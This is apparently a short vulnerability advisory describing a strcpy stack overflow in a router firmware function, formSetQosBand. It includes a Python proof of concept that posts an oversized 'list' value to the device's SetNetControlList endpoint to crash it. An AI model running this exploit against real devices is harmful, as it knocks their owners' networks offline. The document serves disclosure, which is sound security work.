In the function formSetQosBand, the content obtained by the program from the parameter "list" is passed to the chunks created by the program, and then the value of the list is copied directly into the stack via the strcpy function. There is no size checking, so there is a stack overflow vulnerability. Attackers can easily perform denial-of-service attacks using well-crafted overflow data.

<img width="393" height="211" alt="image" src="https://github.com/user-attachments/assets/6b634613-43e4-4162-b93a-2b79e7c03bd6" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetNetControlList"

cookie = {"Cookie":"password=12345"}
data = {"list": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
